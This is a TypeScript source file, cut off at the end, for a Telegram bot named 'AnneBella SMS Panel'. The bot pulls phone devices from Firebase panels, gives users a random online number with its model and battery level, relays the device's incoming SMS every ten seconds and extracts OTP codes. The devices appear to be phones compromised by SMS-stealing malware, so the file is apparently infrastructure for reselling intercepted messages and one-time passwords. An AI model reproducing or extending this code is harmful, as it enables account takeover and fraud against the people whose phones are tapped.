import TelegramBot from "node-telegram-bot-api";
import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { fetchPanelDevices, fetchDeviceSms } from "./firebase";
import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const BOT_USERNAME  = process.env.BOT_USERNAME  || "AnneBella_Sms_Panel_Bot";
const DEVELOPER     = "@annebella";

// Required channels — order determines 2×2 grid layout
const REQUIRED_CHANNELS = [
  { id: "@indiagates",         label: "ᴀɴɴᴇʙᴇʟʟᴀ ɴᴇᴛᴡᴏʀᴋ", url: "https://t.me/indiagates"         },
  { id: "@annebellapanel",     label: "ᴘᴀɴᴇʟ ᴜᴘᴅᴀᴛᴇ",        url: "https://t.me/annebellapanel"     },
  { id: "@AnnebellaStorechat", label: "ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ",        url: "https://t.me/AnnebellaStorechat" },
  { id: "@AnneBellaForums",    label: "ꜰᴏʀᴜᴍ",                url: "https://t.me/AnneBellaForums"    },
];

let bot: TelegramBot | null = null;

export function getBot(): TelegramBot | null {
  return bot;
}

export function initBot(useWebhook = false): TelegramBot {
  if (bot) return bot;
  if (!BOT_TOKEN) {
    logger.error("TELEGRAM_BOT_TOKEN not set");
    throw new Error("TELEGRAM_BOT_TOKEN is required");
  }
  if (useWebhook) {
    bot = new TelegramBot(BOT_TOKEN, { webHook: false });
  } else {
    bot = new TelegramBot(BOT_TOKEN, { polling: true });
    logger.info("Telegram bot started with polling");
    setupHandlers(bot);
  }
  return bot;
}

export function processUpdate(update: TelegramBot.Update): void {
  if (!bot) return;
  bot.processUpdate(update);
}

// ─── Premium Emoji IDs ────────────────────────────────────────────────────────
const E = {
  lightning:    "5355051922862653659",   // ⚡
  sparkle:      "5289722755871162900",   // ✨
  rocket:       "5372917041193828849",   // 🚀
  search:       "5368309348739074032",   // 🔎
  signal:       "5352759161945867747",   // (back arrow — used for BACK button)
  a1:           "5445033158456145975",   // new #1 (status)
  buy2:         "5445353829304387411",   // new (buy credit)
  a2:           "5104966345267610825",   // new #2
  a3:           "4918014360267260850",   // new #3
  a4:           "4915842446845281363",   // new #4
  a5:           "4916086774649848789",   // new #5
  profile2:     "5269531045165816230",   // profile button
  search2:      "5893382531037794941",   // search number button
  globe:        "5372849966689566579",   // 🌐
  profile:      "5206318837489743801",   // 👤
  gift:         "5359664288241829619",   // 🎁
  coin:         "5334998226636390258",   // 🪙
  back:         "5330237710655306682",   // ↩️
  newnum:       "5319160079465857105",   // 🆕
  eye:          "6206155797722830770",   // 👁
  history:      "6206497372176913599",   // 📋
  stop:         "6206479140040743133",   // 🛑
  home:         "6204010762206189094",   // 🏠
  check:        "6206188632747808299",   // ✅
  lock:         "6206404510689007446",   // 🔒
  fire:         "6206080502651164081",   // 🔥
  star:         "6204162490515855272",   // ⭐
  phone:        "6206446249181189526",   // 📱
  crown:        "6206343625232619150",   // 👑
  money:        "6206378324273403309",   // 💰
  note:         "6206108815075579644",   // 🎵
  warn:         "6206110936789423908",   // ⚠️
  trophy:       "6203750195130274981",   // 🏆
  link:         "6025878226260202192",   // 🔗
  support:      "6026056450223116307",   // 🖥️
  buy:          "5395358455768837479",   // 💳
  panel:        "6035152649790164056",   // 🖥️
  tick:         "5863980370340351884",   // ✔️
  id:           "5404561694510833322",   // 🆔
  name:         "5190806721286657692",   // 📛
  joined:       "5195033767969839232",   // 📅
  expire:       "5312361253610475399",   // ⌛
  referral:     "5197269100878907942",   // 👥
  credits:      "5253742260054409879",   // 💎
  online:       "5440621591387980068",   // 🟢
  offline:      "5294048127240655242",   // 🔴
  battery:      "5291933173674957761",   // 🔋
  sim:          "6269085886177087845",   // 📲
  random:       "6017187377116614559",   // 🎲
  status_ok:    "6019476152303750898",   // 🔵
  wave:         "5247133031235329609",   // 〰️
  key:          "5249273776079640466",   // 🔑
  timer:        "5246842176050046092",   // ⏱️
  total:        "5246772116543512028",   // 📊
  device:       "5237761614458933049",   // 📟
  db:           "5235588635885054955",   // 🗄️
  sms:          "5258500422393415126",   // 💬
  refresh:      "5301096984617166561",   // 🔄
};

// Unicode fallback for every entry in E — shown to non-Premium users
const E_FB: Record<string, string> = {
  "5355051922862653659": "⚡",
  "5289722755871162900": "✨",
  "5372917041193828849": "🚀",
  "5368309348739074032": "🔎",
  "5352759161945867747": "📶",
  "5372849966689566579": "🌐",
  "5206318837489743801": "👤",
  "5359664288241829619": "🎁",
  "5334998226636390258": "🪙",
  "5330237710655306682": "↩️",
  "5319160079465857105": "🆕",
  "6206155797722830770": "👁",
  "6206497372176913599": "📋",
  "6206479140040743133": "🛑",
  "6204010762206189094": "🏠",
  "6206188632747808299": "✅",
  "6206404510689007446": "🔒",
  "6206080502651164081": "🔥",
  "6204162490515855272": "⭐",
  "6206446249181189526": "📱",
  "6206343625232619150": "👑",
  "6206378324273403309": "💰",
  "6206108815075579644": "🎵",
  "6206110936789423908": "⚠️",
  "6203750195130274981": "🏆",
  "6025878226260202192": "🔗",
  "6026056450223116307": "🖥️",
  "5395358455768837479": "💳",
  "6035152649790164056": "🖥️",
  "5863980370340351884": "✔️",
  "5404561694510833322": "🆔",
  "5190806721286657692": "📛",
  "5195033767969839232": "📅",
  "5312361253610475399": "⌛",
  "5197269100878907942": "👥",
  "5253742260054409879": "💎",
  "5440621591387980068": "🟢",
  "5294048127240655242": "🔴",
  "5291933173674957761": "🔋",
  "6269085886177087845": "📲",
  "6017187377116614559": "🎲",
  "6019476152303750898": "🔵",
  "5247133031235329609": "〰️",
  "5249273776079640466": "🔑",
  "5246842176050046092": "⏱️",
  "5246772116543512028": "📊",
  "5237761614458933049": "📟",
  "5235588635885054955": "🗄️",
  "5258500422393415126": "💬",
  "5301096984617166561": "🔄",
  "5445033158456145975": "✦",
  "5445353829304387411": "✦",
  "5269531045165816230": "✦",
  "5893382531037794941": "✦",
  "5104966345267610825": "✦",
  "4918014360267260850": "✦",
  "4915842446845281363": "✦",
  "4916086774649848789": "✦",
};

// Premium emoji tag for HTML parse mode.
// Premium users → animated custom emoji sticker.
// Non-premium users → Unicode fallback from E_FB (never blank).
// Pass an explicit non-empty fallback to override the auto-lookup.
function em(id: string, fallback: string): string {
  const fb = fallback !== "" ? fallback : (E_FB[id] ?? "•");
  return `<tg-emoji emoji-id="${id}">${fb}</tg-emoji>`;
}

// ─── Small Caps ───────────────────────────────────────────────────────────────
// Converts uppercase A-Z to Unicode small caps. HTML-aware: skips text inside
// <tags> so HTML markup and emoji-ids are never corrupted.
const SC_MAP: Record<string, string> = {
  A:"ᴀ", B:"ʙ", C:"ᴄ", D:"ᴅ", E:"ᴇ", F:"ꜰ", G:"ɢ", H:"ʜ", I:"ɪ",
  J:"ᴊ", K:"ᴋ", L:"ʟ", M:"ᴍ", N:"ɴ", O:"ᴏ", P:"ᴘ", Q:"ǫ", R:"ʀ",
  S:"ꜱ", T:"ᴛ", U:"ᴜ", V:"ᴠ", W:"ᴡ", X:"x",  Y:"ʏ", Z:"ᴢ",
};

// HTML-aware small caps: skips content inside < > angle brackets
function sc(html: string): string {
  let out = "";
  let inTag = false;
  for (let i = 0; i < html.length; i++) {
    const c = html[i];
    if (c === "<")       { inTag = true;  out += c; }
    else if (c === ">")  { inTag = false; out += c; }
    else if (inTag)      { out += c; }
    else                 { out += SC_MAP[c] ?? c; }
  }
  return out;
}

// Plain-text small caps (for button text — no HTML)
function sct(text: string): string {
  return text.split("").map(c => SC_MAP[c] ?? c).join("");
}

// ─── Keyboards ────────────────────────────────────────────────────────────────
// Telegram Bot API fields on KeyboardButton:
//   style: "success" (green) | "danger" (red) | "primary" (blue)
//   icon_custom_emoji_id: premium emoji ID shown BEFORE the button text

type KBtn = TelegramBot.KeyboardButton & {
  style?: "success" | "danger" | "primary";
  icon_custom_emoji_id?: string;
};
type KRow = KBtn[];
type CKeyboard = { keyboard: KRow[]; resize_keyboard: boolean; is_persistent?: boolean };

function btn(
  text: string,
  style: "success" | "danger" | "primary",
  emojiId?: string
): KBtn {
  return emojiId
    ? { text: sct(text), style, icon_custom_emoji_id: emojiId }
    : { text: sct(text), style };
}

function mainMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("GET NUMBER",            "success", E.a2),         // 5104966345267610825
        btn("WEB PANEL",             "primary", E.sparkle),   // new #6 ✨
      ],
      [
        btn("SUPPORT ( DEVELOPER )", "danger",  E.support),   // 🖥
      ],
      [
        btn("SEARCH NUMBER",         "primary", E.search2),   // 5893382531037794941
        btn("BUY CREDIT",            "success", E.buy2),      // new buy ID
      ],
      [
        btn("STATUS",                "primary", E.name),      // 5190806721286657692
        btn("PROFILE",               "primary", E.profile2),  // 5269531045165816230
      ],
      [
        btn("GIFT CARD",             "success", E.a5),        // new #5
        btn("REFER & EARN",          "success", E.referral),  // 👥
      ],
      [
        btn("BACK",                  "danger",  E.signal),    // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function numberMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("NEW NUMBER",      "success", E.a2),         // new #2
        btn("WATCH SMS",       "success", E.eye),        // 👁
      ],
      [
        btn("SMS HISTORY",     "primary", E.history),    // 📋
        btn("STOP WATCH",      "danger",  E.stop),       // 🛑
      ],
      [
        btn("SEND SMS",        "primary", E.a3),         // new #3
        btn("NUMBERS HISTORY", "primary", E.a4),         // new #4
      ],
      [
        btn("BACK",            "danger",  E.signal),     // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function watchMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("STOP WATCH",  "danger",  E.stop),     // 🛑
        btn("SMS HISTORY", "primary", E.history), // 📋
      ],
      [
        btn("BACK",        "danger",  E.signal),  // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function cancelKeyboard(): CKeyboard {
  return {
    keyboard: [
      [ btn("CANCEL", "danger", E.stop) ],  // 🛑
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function divider(): string {
  return "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️";
}

function generateReferralCode(telegramId: string): string {
 return `ref_${telegramId}`;
}

async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | null) {
  const telegramId = String(msg.from!.id);
  const [existing] = await db
    .select()
    .from(botUsersTable)
    .where(eq(botUsersTable.telegramId, telegramId));

  if (existing) return existing;

  const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
  const [user] = await db
    .insert(botUsersTable)
    .values({
      telegramId,
      username: msg.from?.username || null,
      firstName: msg.from?.first_name || "User",
      referralCode: generateReferralCode(telegramId),
      referredBy: referredBy || null,
      getNumberExpiresAt: expiresAt,
    })
    .returning();

  if (referredBy) {
    const [referrer] = await db
      .select()
      .from(botUsersTable)
      .where(eq(botUsersTable.referralCode, referredBy));

    if (referrer) {
      const newCount = referrer.referralCount + 1;
      const now = new Date();

      const currentExpiry = referrer.getNumberExpiresAt
        ? new Date(Math.max(referrer.getNumberExpiresAt.getTime(), now.getTime()))
        : now;
      const newExpiry = new Date(currentExpiry.getTime() + 12 * 60 * 60 * 1000);

      const sendSmsUnlocked = newCount >= 10 ? true : referrer.sendSmsUnlocked;
      const newSmsCredits =
        newCount >= 10 && !referrer.sendSmsUnlocked
          ? referrer.smsCredits + 500
          : newCount > 10
          ? referrer.smsCredits + 100
          : referrer.smsCredits;

      let webPanelExpiry = referrer.webPanelExpiresAt;
      if (newCount === 10) {
        const webBase = webPanelExpiry
          ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime()))
          : now;
        webPanelExpiry = new Date(webBase.getTime() + 24 * 60 * 60 * 1000);
      } else if (newCount > 10 && webPanelExpiry) {
        const webBase = new Date(Math.max(webPanelExpiry.getTime(), now.getTime()));
        webPanelExpiry = new Date(webBase.getTime() + 12 * 60 * 60 * 1000);
      }

      await db
        .update(botUsersTable)
        .set({ referralCount: newCount, getNumberExpiresAt: newExpiry, sendSmsUnlocked, smsCredits: newSmsCredits, webPanelExpiresAt: webPanelExpiry })
        .where(eq(botUsersTable.id, referrer.id));

      await db.insert(referralsTable).values({ referrerId: referrer.id, referredTelegramId: telegramId });
    }
  }

  return user;
}

async function hasGetNumberAccess(user: { getNumberExpiresAt: Date | null }): Promise<boolean> {
  if (!user.getNumberExpiresAt) return false;
  return user.getNumberExpiresAt > new Date();
}

// Check which channels the user has joined (requires bot to be admin in channels)
async function checkMembership(bot: TelegramBot, telegramId: string): Promise<boolean[]> {
  return Promise.all(
    REQUIRED_CHANNELS.map(async (ch) => {
      try {
        const m = await bot.getChatMember(ch.id, parseInt(telegramId));
        return ["member", "administrator", "creator"].includes(m.status);
      } catch {
        return false; // channel not accessible or user not found
      }
    })
  );
}

// ─── Inline button with premium emoji via Bot API entities ───────────────────
// Telegram Bot API 7.0+ supports `entities` on InlineKeyboardButton text.
// The Unicode fallback char sits at offset 0; the entity overlays the custom
// emoji sticker on top for Premium users. Non-premium see the plain Unicode.
function iBtn(opts: {
  label:    string;
  emojiId:  string;
  fallback: string;            // Unicode placeholder e.g. "✅"
  url?:     string;
  cb?:      string;
  color?:   number;
  style?:   "success" | "danger" | "primary";
}): any {
  const emojiLen = [...opts.fallback].length; // surrogate-safe length
  const btn: any = {
    text:     opts.fallback + " " + opts.label,
    color:    opts.color ?? 3,
    style:    opts.style ?? "success",
    entities: [{ type: "custom_emoji", offset: 0, length: emojiLen, custom_emoji_id: opts.emojiId }],
  };
  if (opts.url) btn.url          = opts.url;
  if (opts.cb)  btn.callback_data = opts.cb;
  return btn;
}

// Build 2×2 inline channel keyboard with join status + premium emoji
function buildChannelKeyboard(joined: boolean[], allJoined: boolean): { inline_keyboard: any[][] } {
  const rows: any[][] = [];
  for (let i = 0; i < REQUIRED_CHANNELS.length; i += 2) {
    const row: any[] = [];
    for (let j = i; j < Math.min(i + 2, REQUIRED_CHANNELS.length); j++) {
      const ch = REQUIRED_CHANNELS[j];
      const ok = joined[j];
      row.push(iBtn({
        label:   ch.label,
        emojiId: ok ? E.check : E.link,
        fallback: ok ? "✅" : "🔗",
        url:     ch.url,
      }));
    }
    rows.push(row);
  }

  // "I JOINED" / "ALL JOINED" — blue
  rows.push([iBtn({
    label:   allJoined ? "ᴀʟʟ ᴊᴏɪɴᴇᴅ — ᴇɴᴛᴇʀ ʙᴏᴛ" : "ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ",
    emojiId: allJoined ? E.rocket : E.check,
    fallback: allJoined ? "🚀" : "✅",
    cb:      "check_joined",
    color:   4,
    style:   "primary",
  })]);
  return { inline_keyboard: rows };
}

async function getAllOnlineDevices() {
  const panels = await db.select().from(panelsTable);
  const all = [];
  for (const panel of panels) {
    const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
    all.push(...devices.filter((d) => d.status));
  }
  return all;
}

// Watch polling: userId → intervalId
const watchIntervals = new Map<string, NodeJS.Timeout>();
const watchLastSms   = new Map<string, string>();

// ─── Handlers ─────────────────────────────────────────────────────────────────

function setupHandlers(bot: TelegramBot) {
  // Auto-applies sc() small-caps + defaults parse_mode to HTML
  const send = (cid: number, html: string, opts: Record<string, any> = {}) =>
    bot.sendMessage(cid, sc(html), { parse_mode: "HTML", ...opts });

  bot.on("message", async (msg) => {
    if (!msg.from || !msg.text) return;
    const chatId     = msg.chat.id;
    const text       = msg.text.trim();
    const telegramId = String(msg.from.id);

    try {
      // ── /start ──────────────────────────────────────────────────────────
      if (text.startsWith("/start")) {
        const param      = text.split(" ")[1] || null;
        const referredBy = param?.startsWith("ref_") ? param : null;
        const user       = await getOrCreateUser(msg, referredBy);

        // Welcome message with premium emoji
        await send(
          chatId,
          `${em(E.sparkle, "")} <b>ANNEBELLA SMS PANEL</b> ${em(E.sparkle, "")}\n` +
          `${divider()}\n\n` +
 `${em(E.sparkle, "")} <b>WELCOME TO ANNEBELLA SMS PANEL!</b>\n\n` +
 `${em(E.lightning, "")}${em(E.lightning, "")} <b>AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!</b>\n` +
 `KOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n` +
 `${em(E.expire, "")} 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\n` +
 `${em(E.coin, "")} REFER KARO AUR EXTRA HOURS PAO!`,
          { parse_mode: "HTML", reply_markup: { remove_keyboard: true } }
        );

        // Check which channels user has already joined
        const joined    = await checkMembership(bot, telegramId);
        const joinCount = joined.filter(Boolean).length;
        const total     = REQUIRED_CHANNELS.length;
        const allJoined = joinCount === total;

        if (allJoined) {
          // Skip verification — go straight to main menu
          await send(
            chatId,
 `${em(E.check, "")} <b>ᴀʟʟ ᴄʜᴀɴɴᴇʟꜱ ᴠᴇʀɪꜰɪᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL MEIN AAPKA SWAGAT HAI.\n` +
            `${em(E.rocket, "")} ᴀᴄᴄᴇꜱꜱ ᴀʙ ᴜɴʟᴏᴄᴋ ʜᴀɪ.`,
            { parse_mode: "HTML", reply_markup: buildChannelKeyboard(joined, true) }
          );
          await send(
            chatId,
 `${em(E.lightning, "")} <b>ʙᴏᴛ ʀᴇᴀᴅʏ! ᴜꜱᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ.</b>`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        } else {
          await send(
            chatId,
 `${em(E.lock, "")} <b>ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL KA FULL ACCESS PANE KE LIYE\nNICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
            `${em(E.globe, "")} <b>ᴘʀᴏɢʀᴇꜱꜱ: ${joinCount}/${total} ᴊᴏɪɴᴇᴅ</b>\n\n` +
            `CHANNELS JOIN KARNE KE BAAD <b>ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ</b> BUTTON DABAO.`,
            { parse_mode: "HTML", reply_markup: buildChannelKeyboard(joined, false) }
          );
        }
        return;
      }

      // ── Fetch user ───────────────────────────────────────────────────────
      const [user] = await db
        .select()
        .from(botUsersTable)
        .where(eq(botUsersTable.telegramId, telegramId));

      if (!user) {
        await send(chatId, "PLEASE SEND /start TO BEGIN.");
        return;
      }

      // ── Main menu navigation ─────────────────────────────────────────────

      if (text === sct("GET NUMBER")) {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>GET NUMBER ACCESS EXPIRED!</b>\n\n` +
            `ACCESS KHATAM HO GAYA.\n` +
            `${em(E.coin, "")} HAR REFERRAL = +12HR ACCESS\n\n` +
            `REFER & EARN DABAO AUR LINK SHARE KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.lightning, "")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const onlineDevices = await getAllOnlineDevices();
        if (onlineDevices.length === 0) {
          await send(
            chatId,
 `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "")} THODI DER BAAD DOBARA TRY KARO — NUMBERS REGULARLY ACTIVE HOTE HAIN.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
          .where(eq(botUsersTable.id, user.id));

        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await send(
          chatId,
 `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
          `${em(E.phone, "")} <b>NUMBER</b>      : ${device.phoneNumber || "Unknown"}\n` +
          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelId}\n` +
          `${em(E.check, "")} <b>STATUS</b>      : ONLINE\n` +
          `${em(E.battery, "")} <b>BATTERY</b>     : ${device.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
          `${em(E.history, "")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("NEW NUMBER")) {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>ACCESS EXPIRED!</b> REFER KARKE ACCESS BADHAO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.lightning, "")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const onlineDevices = await getAllOnlineDevices();
        if (onlineDevices.length === 0) {
          await send(
            chatId,
 `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "")} THODI DER BAAD DOBARA TRY KARO.`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }

        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId })
          .where(eq(botUsersTable.id, user.id));

        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await send(
          chatId,
 `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
          `${em(E.phone, "")} <b>NUMBER</b>      : ${device.phoneNumber || "Unknown"}\n` +
          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelId}\n` +
          `${em(E.check, "")} <b>STATUS</b>      : ONLINE\n` +
          `${em(E.battery, "")} <b>BATTERY</b>     : ${device.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
          `${em(E.history, "")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("WATCH SMS")) {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "FIRST GET NUMBER DABAO.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "PANEL NOT FOUND.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const existing = watchIntervals.get(telegramId);
        if (existing) clearInterval(existing);

        await send(
          chatId,
 `${em(E.eye, "")} <b>WATCHING FOR OTPS...</b>\n` +
          `${divider()}\n\n` +
          `${em(E.phone, "")} <b>NUMBER:</b> ${user.assignedDeviceId}\n\n` +
          `NEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\n` +
          `${em(E.warn, "")} SPAM / RECHARGE SMS ARE AUTO-BLOCKED.\n\n` +
          `${em(E.stop, "")} TAP <b>STOP WATCH</b> TO STOP.`,
          { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
        );

        const intervalId = setInterval(async () => {
          try {
            const msgs = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
            if (msgs.length === 0) return;
            const latest = msgs[0];
 const key = `${latest.sender}:${latest.text}:${latest.time}`;
            if (key !== watchLastSms.get(telegramId)) {
              watchLastSms.set(telegramId, key);
              const otp = latest.text.match(/\b\d{4,8}\b/)?.[0];
              await send(
                chatId,
 `${em(E.lightning, "")} <b>NEW SMS RECEIVED!</b>\n\n` +
                `From: <code>${latest.sender}</code>\nTime: ${latest.time}\n\n${latest.text}` +
                (otp ? `\n\n${em(E.check, "")} <b>OTP: ${otp}</b>` : ""),
                { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
              );
            }
          } catch (err) {
            logger.error({ err }, "Watch SMS polling error");
          }
        }, 10000);

        watchIntervals.set(telegramId, intervalId);
        await db.update(botUsersTable).set({ state: "watching" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === sct("STOP WATCH")) {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.stop, "")} <b>WATCH STOPPED.</b>`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SMS HISTORY")) {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "FIRST GET NUMBER DABAO.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }
        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "PANEL NOT FOUND.", { reply_markup: numberMenuKeyboard() as any });
          return;
        }
        const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
        if (messages.length === 0) {
          await send(
            chatId,
 `${em(E.history, "")} <b>NO SMS HISTORY FOUND.</b>`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }
        const lines = messages
          .slice(0, 10)
 .map((m, i) => `${i + 1}. <b>${m.sender}</b>\n ${m.time}\n ${m.text.slice(0, 100)}`)
          .join("\n\n");

        await send(
          chatId,
 `${em(E.history, "")} <b>SMS HISTORY (${messages.length} msgs)</b>\n${divider()}\n\n${lines}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("NUMBERS HISTORY")) {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "Koi number assign nahi hai abhi.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }
        await send(
          chatId,
 `${em(E.phone, "")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
          `${em(E.id, "")} <b>LAST ASSIGNED:</b> N${user.assignedDeviceId}\n` +
          `${em(E.db, "")} <b>PANEL ID:</b> ${user.assignedPanelId}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("STATUS")) {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0, totalOffline = 0, totalDevices = 0;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline  += devices.filter((d) => d.status).length;
          totalOffline += devices.filter((d) => !d.status).length;
          totalDevices += devices.length;
        }

        await send(
          chatId,
 `${em(E.check, "")} <b>STATUS REPORT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.check, "")} <b>ALL PANELS — TOTAL</b>\n` +
          `${em(E.check, "")} <b>ONLINE</b> : ${totalOnline}\n` +
          `${em(E.offline, "")} <b>OFFLINE</b> : ${totalOffline}\n` +
          `${em(E.check, "")} <b>GRAND TOTAL</b> : ${totalDevices}\n\n` +
          `${em(E.refresh, "")} <b>LIVE DATA</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SEARCH NUMBER")) {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0;
        for (const panel of panels) {
          const devs = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline += devs.filter((d) => d.status).length;
        }
        await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.search, "")} <b>SEARCH NUMBER</b>\n` +
          `${divider()}\n\n` +
          `${em(E.globe, "")} ALL PANELS CONNECTED. CURRENTLY <b>${totalOnline}</b> ONLINE NUMBERS LOADED.\n\n` +
          `ENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n` +
          `Example: <code>9876543210</code>\n\n` +
          `Tap <b>CANCEL</b> to go back.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === sct("REFER & EARN")) {
        const expiryStr = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
          ? `${em(E.check, "")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
          : `${em(E.expire, "")} EXPIRED`;

        const webStatus = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
          ? `${em(E.check, "")} ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
          : `${em(E.lock, "")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

        const sendStatus = user.sendSmsUnlocked
